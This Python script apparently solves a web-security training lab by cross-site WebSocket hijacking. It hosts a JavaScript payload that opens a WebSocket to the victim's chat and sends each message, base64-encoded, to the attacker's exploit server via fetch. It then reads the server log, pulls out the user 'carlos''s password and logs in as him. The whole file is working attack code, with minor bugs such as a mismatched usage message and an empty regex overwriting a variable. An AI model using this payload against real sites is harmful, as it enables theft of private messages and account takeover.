import base64
import time
import re
import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url> <your collabolator url>")
        sys.exit(1)

burp_url = sys.argv[1]
web_socket_url = burp_url[8:]
chat = burp_url + '/chat'
deliver_url = burp_url + '/deliver-to-victim'
login_url = burp_url + '/login'

session = requests.Session()
session.headers.update({'User-Agent': 'Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'})

response = session.get(burp_url)
match = re.search(r'https://exploit-[0-9a-fA-F]+\.exploit-server\.net', response.text)
exploit_server = match.group(0)
session.get(chat)
log_url = exploit_server + '/log'


burp_data = {"urlIsHttps": "on", "responseFile": "/exploit", "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8", "responseBody": f"<script>\r\n    websocket = new WebSocket('wss://{web_socket_url}/chat')\r\n    websocket.onopen = start\r\n    websocket.onmessage = handleReplay\r\n    function start(event) {{\r\n        websocket.send(\"READY\");\r\n    }}\r\n    function handleReplay(event){{\r\n        fetch('{exploit_server}/exploit?xxxx='+btoa(event.data))\r\n    }}\r\n</script>", "formAction": "STORE"}
session.post(exploit_server, data=burp_data)

time.sleep(2)

response = session.get(exploit_server+'/log')
match = re.search(r'', response.text)
exploit_server = match.group(0)

session.get(deliver_url)

time.sleep(3)
response = session.get(log_url)
matches = re.findall(r'xxxx=([A-Za-z0-9+/=]+)\s', response.text)
carlos_pass = None

for encoded_str in matches:
    decoded_str = base64.b64decode(encoded_str).decode('utf-8')
    match = re.search(r"([0-9a-zA-Z]{20})", decoded_str)
    if match:
        carlos_pass = match.group(1)
        print(carlos_pass)
        break

response = session.get(login_url)
match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = match.group(1)
burp_data = {"csrf": csrf,"username": "carlos", "password": carlos_pass}
session.post(login_url, data=burp_data)
